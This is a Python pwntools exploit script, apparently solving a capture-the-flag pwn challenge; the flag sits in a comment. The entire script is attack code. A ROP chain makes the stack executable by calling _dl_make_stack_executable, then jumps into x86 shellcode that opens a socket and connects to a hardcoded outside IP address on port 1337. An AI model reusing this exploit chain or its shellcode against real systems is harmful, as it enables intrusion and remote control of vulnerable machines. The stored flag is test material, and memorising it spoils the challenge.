from pwn import *

#FLAG{Ar3_y0u_k1dd1ng_m3}

host = 'ctf.yuawn.idv.tw'
port = 10106
#host = '127.0.0.1'
#port = 1337
y = remote(host,port)


jmp_esp = 0x80bd13b
_dl_make_stack_executable = 0x809a080
_stack_prot = 0x80e9fec
_libc_stack_end = 0x80e9fc8

pop_eax = 0x80b8536
pop_edx = 0x806ec8b
mov_edx_eax = 0x805462b

p = 'A' * 12
p += p32(pop_edx)
p += p32(_stack_prot)
p += p32(pop_eax)
p += p32(0x7)
p += p32(mov_edx_eax)
p += p32(pop_eax)
p += p32(_libc_stack_end)
p += p32(_dl_make_stack_executable)
p += p32(jmp_esp)

s = """
push   0x0
push   0x1
push   0x2
push   0x66
pop    eax
push   0x1
pop    ebx
mov    ecx,esp
int    0x80
push   0x88bd738c
push   0x39050002
mov    ecx,esp
push   0x10
push   ecx
push   eax
push   0x66
pop    eax
push   0x3
pop    ebx
mov    ecx,esp
int    0x80
"""
ss = asm(s)

p += ss
p += asm('mov eax, 0x804887c;jmp eax')

print len(p)

y.send(p)

y.interactive()
